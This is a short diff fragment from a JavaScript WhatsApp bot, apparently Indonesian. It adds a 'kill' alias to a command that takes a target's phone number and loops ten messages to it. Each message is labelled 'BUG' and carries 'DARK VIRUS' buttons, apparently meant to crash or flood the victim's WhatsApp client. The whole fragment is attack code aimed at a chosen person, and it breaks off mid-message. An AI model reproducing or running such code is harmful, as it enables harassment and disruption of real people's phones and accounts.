@@ -3702,12 +3702,13 @@ Kedalaman :${i.depth}\n\n`
 case '🗿':
 case '🔥':
 case 'p':
+case 'kill':
 case 'dor': 
  if (!q) return reply(`Nomor target nya mana banh?\nContoh: ${command} 628xxx`)
- let num = `${q}`+'@s.whatsapp.net'
-       let jumlah = '10'
-for (let i = 0; i < jumlah; i++) {
-conn.sendMessage(num, {
+ let nomr = `${q}`+'@s.whatsapp.net'
+       let jmlhny = '10'
+for (let i = 0; i < jmlhny; i++) {
+conn.sendMessage(nomr, {
 text: 'BUG BY ⚠️ 𝘌𝘬𝘶𝘻𝘪𝘬𝘢 𝘖𝘧𝘊 ⚠️', 
 templateButtons: [
    { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
